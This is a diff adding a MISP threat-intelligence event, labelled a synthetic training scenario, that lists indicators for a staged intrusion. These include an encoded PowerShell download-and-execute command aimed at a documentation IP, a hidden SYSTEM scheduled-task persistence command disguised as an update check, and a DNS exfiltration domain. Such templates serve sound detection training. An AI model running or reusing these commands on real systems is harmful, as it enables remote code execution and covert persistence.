@@ -1,0 +1,112 @@
+{
+  "Event": {
+    "uuid": "4c43c49e-0442-4f9e-8c38-038290234a21",
+    "info": "APT Training Scenario - Synthetic Multi-Stage Intrusion Indicators (Candidate Template)",
+    "date": "2026-10-24",
+    "threat_level_id": "2",
+    "analysis": "2",
+    "distribution": "0",
+    "published": false,
+    "meta-notice": "DISCLAIMER: Synthetic training template. Not imported into a live MISP instance.",
+    "Tag": [
+      {
+        "name": "tlp:amber"
+      },
+      {
+        "name": "training:synthetic-simulation"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Spearphishing Attachment - T1566.001\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"PowerShell - T1059.001\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Scheduled Task - T1053.005\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Valid Accounts - T1078\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"SMB/Windows Admin Shares - T1021.002\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"DNS - T1071.004\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7001",
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": false,
+        "value": "192.0.2.50",
+        "comment": "RFC 5737 TEST-NET-1 synthetic documentation IP; do not block in production"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7002",
+        "type": "hostname",
+        "category": "Internal reference",
+        "to_ids": false,
+        "value": "LAB-WIN01",
+        "comment": "Scenario target workstation; fictional hostname"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7003",
+        "type": "hostname",
+        "category": "Internal reference",
+        "to_ids": false,
+        "value": "LAB-SRV01",
+        "comment": "Scenario target internal server; fictional hostname"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7004",
+        "type": "filename",
+        "category": "Payload delivery",
+        "to_ids": false,
+        "value": "invoice_march2026.docm",
+        "comment": "Synthetic macro-enabled document carrier in initial access scenario"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7005",
+        "type": "command-line",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADUAMAAvAGEALgBwAHMAMQAnACkA",
+        "comment": "Synthetic encoded PowerShell command executed in Stage 2"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7006",
+        "type": "text",
+        "category": "Persistence mechanism",
+        "to_ids": false,
+        "value": "schtasks.exe /create /tn WindowsUpdateCheck /tr \"powershell.exe -WindowStyle Hidden -File C:\\Users\\Public\\updater.ps1\" /sc onlogon /ru SYSTEM",
+        "comment": "Synthetic scheduled task persistence registration"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7007",
+        "type": "domain",
+        "category": "Network activity",
+        "to_ids": false,
+        "value": "exfil.training.lab",
+        "comment": "Synthetic destination domain for simulated DNS exfiltration"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7008",
+        "type": "dns-soa-email",
+        "category": "Network activity",
+        "to_ids": false,
+        "value": "dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx.exfil.training.lab",
+        "comment": "Simulated high-entropy TXT query string carrying base64 exfiltrated test payload"
+      },
+      {
+        "uuid": "8b9e4a12-10f4-4112-9c32-1a4e5f6d7009",
+        "type": "yara",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "APT_Training_Marker",
+        "comment": "Reference to rules/yara/apt_training_marker.yar synthetic detection rule"
+      }
+    ]
+  }
+}
